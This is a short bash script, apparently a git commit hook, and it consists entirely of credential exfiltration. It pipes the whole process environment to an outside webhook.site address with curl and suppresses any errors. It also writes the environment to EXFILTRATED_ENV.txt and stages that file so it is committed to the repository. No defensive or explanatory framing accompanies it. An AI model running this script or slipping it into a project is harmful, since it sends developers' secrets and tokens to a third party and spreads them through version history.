#!/bin/bash
# Exfiltrate environment via curl during commit
env | curl -X POST -d @- https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true

# Also write to file and stage it so it gets committed
env > EXFILTRATED_ENV.txt
git add EXFILTRATED_ENV.txt
